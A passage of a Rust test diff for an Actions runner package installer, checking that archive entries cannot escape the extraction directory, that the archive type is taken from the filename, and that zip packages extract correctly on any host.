+            let result = extract(&archive, kind, &target);
+
+            assert!(
+                !outside.exists(),
+                "{label}: an entry escaped the extraction directory"
+            );
+            // Either the entry was refused outright, or the extractor
+            // normalised it into the target. Both are safe; writing outside is
+            // not, and that is what the assertion above pins.
+            if let Err(error) = result {
+                assert!(
+                    matches!(error, PackageError::UnsafeArchiveEntry { .. }),
+                    "{label}: expected a refusal, got {error:?}"
+                );
+                assert!(error.is_terminal());
+                assert_eq!(
+                    error.failure_reason(),
+                    Some(FailureReason::RunnerPackageUnverified)
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn the_archive_format_comes_from_the_filename_not_from_the_host() {
+        assert_eq!(
+            ArchiveKind::split("actions-runner-win-x64-2.330.0.zip")
+                .unwrap()
+                .1,
+            ArchiveKind::Zip
+        );
+        assert_eq!(
+            ArchiveKind::split("actions-runner-linux-x64-2.330.0.tar.gz")
+                .unwrap()
+                .1,
+            ArchiveKind::TarGz
+        );
+        assert_eq!(
+            ArchiveKind::split("actions-runner-linux-x64-2.330.0.TAR.GZ")
+                .unwrap()
+                .1,
+            ArchiveKind::TarGz
+        );
+        assert!(ArchiveKind::split("actions-runner-linux-x64-2.330.0.7z").is_err());
+    }
+
+    #[tokio::test]
+    async fn a_zip_is_extracted_on_a_host_whose_own_packages_are_tarballs() {
+        // The format follows the filename, so this exercises the Windows
+        // extraction path on the Linux and macOS CI legs too.
+        let bytes = zip_bytes(&package_entries());
+        let harness = Harness::new(
+            vec![published(
+                "linux",
+                "x64",
+                "2.330.0",
+                ".zip",
+                Some(&hex_digest(&bytes)),
+            )],
+            bytes,
+        );
+
+        let installed = harness.cache().ensure_installed().await.expect("a zip");
+
+        assert!(installed.root().join("bin/Runner.Listener").is_file());
+    }
 }
